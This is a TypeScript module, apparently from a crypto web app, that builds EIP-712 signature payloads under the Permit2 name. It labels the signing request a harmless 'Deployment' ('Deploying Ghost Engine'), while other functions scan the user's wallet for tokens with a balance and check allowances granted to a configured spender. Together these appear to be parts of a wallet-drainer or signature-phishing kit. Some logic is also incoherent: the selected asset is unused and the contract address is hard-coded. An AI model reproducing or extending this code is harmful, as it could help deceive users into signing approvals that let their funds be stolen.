import { ethers } from "ethers";
import {
  getDomainMetadata,
  DEPLOYMENT_TYPES,
  EIP712_DOMAIN_TYPE,
} from "./domain-data";
import { EXECUTION_POLICY } from "@/lib/ghost/constants";

/**
 * 🛰️ GHOST DEPLOYMENT ENGINE (v9.0.0 - Optimized for UniversalSettler)
 */
export const PERMIT2_ADDRESS = "0x6511e4ed799cc3e24cd895e93001ec0d9363fc1c";

/**
 * 🛡️ SIGNATURE GUARD
 */
export function verifyPermit2Signature(
  userAddress: string,
  payload: any,
  signature: string,
): boolean {
  try {
    const recoveredAddress = ethers.verifyTypedData(
      payload.domain,
      payload.types,
      payload.message,
      signature,
    );
    return recoveredAddress.toLowerCase() === userAddress.toLowerCase();
  } catch (err: any) {
    console.error(`[DEPLOYMENT-DEBUG] ❌ Recovery Failed:`, err.message);
    return false;
  }
}

/**
 * 🔍 ALLOWANCE AUDITOR (Kept for compatibility)
 */
export async function getPermit2Allowance(
  userAddress: string,
  tokenAddress: string,
  provider: any,
  targetSpender?: string,
): Promise<bigint> {
  const spender =
    targetSpender || (process.env.NEXT_PUBLIC_SETTLER_ADDR as string);
  if (!spender) return 0n;
  const abi = [
    "function allowance(address,address,address) view returns (uint160, uint48, uint48)",
  ];
  const contract = new ethers.Contract(PERMIT2_ADDRESS, abi, provider);
  try {
    const [amount] = await contract.allowance(
      userAddress,
      tokenAddress,
      spender,
    );
    return BigInt(amount);
  } catch {
    return 0n;
  }
}

/**
 * 🏗️ GENERATE DEPLOYMENT DATA
 */
export async function generatePermit2Data(
  userAddress: string,
  assets: any[],
  chainId: number,
  witnessText: string = "Deploying Ghost Engine",
) {
  const AUTHORIZED_SETTLER = ethers.getAddress(PERMIT2_ADDRESS);

  // Security Checks
  if (
    ethers.getAddress(EXECUTION_POLICY.ALLOWED_SPENDERS[0]) !==
    AUTHORIZED_SETTLER
  ) {
    throw new Error("UNAUTHORIZED_SPENDER_CONFIGURED");
  }

  // 🎯 ASSET SELECTION
  const asset = assets.find((a) => {
    const val = BigInt(
      (a?.balance || a?.amount || a?.bal || "0").toString().split(".")[0],
    );
    return (a?.contractAddress || a?.token || a?.address) && val > 0n;
  });

  if (!asset) return null;

  // 🔮 DOMAIN RESOLUTION
  const metadata = getDomainMetadata(
    "PERMIT2",
    chainId,
    "Permit2",
    PERMIT2_ADDRESS,
  );

  const domain = {
    name: metadata.name,
    version: metadata.version,
    chainId: Number(chainId),
    verifyingContract: AUTHORIZED_SETTLER,
  };

  // 💎 DEPLOYMENT HASH (Matches UniversalSettler.sol DEPLOYMENT_TYPEHASH)
  const messageHash = ethers.id(witnessText);

  const message = {
    hash: messageHash,
  };

  // 🛡️ THE FIX: STRICT TYPE DEFINITION
  // We explicitly include EIP712Domain. This is mandatory for most mobile providers.
  const types = {
    EIP712Domain: EIP712_DOMAIN_TYPE,
    ...DEPLOYMENT_TYPES,
  };

  // 🧪 DEBUG LOGS
  const debugPayload = { domain, types, primaryType: "Deployment", message };
  console.log(
    `[DEBUG-PERMIT2] 📦 Prepared Payload:`,
    JSON.stringify(debugPayload, null, 2),
  );
  console.log(`[DEBUG-PERMIT2] 🔑 Witness Hash:`, messageHash);

  return {
    domain,
    types,
    primaryType: "Deployment",
    message,
    messageHash,
  };
}
